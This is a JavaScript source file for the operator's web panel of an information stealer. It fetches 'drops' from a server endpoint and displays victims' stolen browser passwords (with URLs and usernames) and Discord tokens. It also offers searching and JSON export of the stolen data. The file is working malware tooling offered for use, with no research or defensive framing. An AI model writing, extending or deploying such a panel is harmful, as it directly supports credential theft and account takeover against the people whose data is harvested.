/** stealer.js — standalone stealer drops viewer */

let allDrops = [];
let searchTerm = "";

const dropList = document.getElementById("drop-list");
const emptyState = document.getElementById("empty-state");
const dropCount = document.getElementById("drop-count");
const searchInput = document.getElementById("search-input");
const refreshBtn = document.getElementById("refresh-btn");
const exportBtn = document.getElementById("export-btn");

async function fetchDrops() {
  try {
    const res = await fetch("/api/steal-drops");
    if (!res.ok) throw new Error(res.statusText);
    allDrops = await res.json();
    render();
  } catch (e) {
    console.error("Failed to fetch stealer drops", e);
  }
}

function matches(drop) {
  if (!searchTerm) return true;
  const q = searchTerm.toLowerCase();
  for (const c of drop.credentials) {
    if (c.url?.toLowerCase().includes(q)) return true;
    if (c.username?.toLowerCase().includes(q)) return true;
    if (c.browser?.toLowerCase().includes(q)) return true;
    if (c.profile?.toLowerCase().includes(q)) return true;
  }
  for (const t of drop.tokens) {
    if (t.toLowerCase().includes(q)) return true;
  }
  return false;
}

function escHtml(s) {
  return String(s ?? "")
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;");
}

function renderDrop(drop, idx) {
  const date = new Date(drop.ts).toLocaleString();
  const credCount = drop.credentials.length;
  const tokenCount = drop.tokens.length;

  let credsHtml = "";
  if (credCount > 0) {
    credsHtml = `
      <div class="mt-3">
        <div class="text-xs font-semibold text-slate-400 mb-1 uppercase tracking-wide">
          <i class="fa-solid fa-lock text-violet-400"></i> Passwords (${credCount})
        </div>
        <div class="overflow-x-auto">
          <table class="w-full text-xs border-collapse">
            <thead>
              <tr class="text-slate-500 border-b border-slate-700">
                <th class="text-left py-1 pr-3 font-medium">Browser</th>
                <th class="text-left py-1 pr-3 font-medium">Profile</th>
                <th class="text-left py-1 pr-3 font-medium">URL</th>
                <th class="text-left py-1 pr-3 font-medium">Username</th>
                <th class="text-left py-1 font-medium">Password</th>
              </tr>
            </thead>
            <tbody class="font-mono">
              ${drop.credentials.map(c => `
                <tr class="border-b border-slate-800/50 hover:bg-slate-800/30">
                  <td class="py-1 pr-3 text-cyan-300">${escHtml(c.browser)}</td>
                  <td class="py-1 pr-3 text-slate-400">${escHtml(c.profile)}</td>
                  <td class="py-1 pr-3 text-blue-300 max-w-xs truncate" title="${escHtml(c.url)}">${escHtml(c.url)}</td>
                  <td class="py-1 pr-3 text-green-300">${escHtml(c.username)}</td>
                  <td class="py-1 text-yellow-200">${escHtml(c.password)}</td>
                </tr>`).join("")}
            </tbody>
          </table>
        </div>
      </div>`;
  }

  let tokensHtml = "";
  if (tokenCount > 0) {
    tokensHtml = `
      <div class="mt-3">
        <div class="text-xs font-semibold text-slate-400 mb-1 uppercase tracking-wide">
          <i class="fa-brands fa-discord text-indigo-400"></i> Discord Tokens (${tokenCount})
        </div>
        <div class="flex flex-col gap-1">
          ${drop.tokens.map(t => `<div class="font-mono text-xs text-indigo-200 bg-slate-800/60 rounded px-2 py-1 break-all">${escHtml(t)}</div>`).join("")}
        </div>
      </div>`;
  }

  let errorsHtml = "";
  if (drop.errors?.length > 0) {
    errorsHtml = `
      <div class="mt-2">
        <div class="text-xs font-semibold text-slate-500 mb-1 uppercase tracking-wide">Errors</div>
        <div class="text-xs font-mono text-red-400/70 space-y-0.5">
          ${drop.errors.map(e => `<div>${escHtml(e)}</div>`).join("")}
        </div>
      </div>`;
  }

  return `
    <div class="drop-card bg-slate-900/70 border border-slate-800 rounded-lg p-4 transition-colors">
      <div class="flex items-center justify-between gap-2 flex-wrap">
        <div class="flex items-center gap-2 text-sm">
          <i class="fa-solid fa-circle-dot text-violet-400"></i>
          <span class="text-slate-200 font-semibold">Drop #${idx + 1}</span>
          <span class="text-slate-500">${escHtml(date)}</span>
        </div>
        <div class="flex gap-2 text-xs">
          <span class="px-2 py-0.5 bg-violet-900/40 border border-violet-700/40 text-violet-300 rounded-full">${credCount} creds</span>
          <span class="px-2 py-0.5 bg-indigo-900/40 border border-indigo-700/40 text-indigo-300 rounded-full">${tokenCount} tokens</span>
        </div>
      </div>
      ${credsHtml}${tokensHtml}${errorsHtml}
    </div>`;
}

function render() {
  const filtered = allDrops.filter(matches);
  dropCount.innerHTML = `<i class="fa-solid fa-key"></i> ${filtered.length} drop${filtered.length !== 1 ? "s" : ""}`;

  if (filtered.length === 0) {
    dropList.innerHTML = "";
    emptyState.classList.remove("hidden");
    return;
  }
  emptyState.classList.add("hidden");
  dropList.innerHTML = filtered.map((d, i) => renderDrop(d, allDrops.indexOf(d))).join("");
}

searchInput.addEventListener("input", () => {
  searchTerm = searchInput.value.trim();
  render();
});

refreshBtn.addEventListener("click", fetchDrops);

exportBtn.addEventListener("click", () => {
  const blob = new Blob([JSON.stringify(allDrops, null, 2)], { type: "application/json" });
  const a = document.createElement("a");
  a.href = URL.createObjectURL(blob);
  a.download = `stealer-drops-${Date.now()}.json`;
  a.click();
});

// Initial load
fetchDrops();
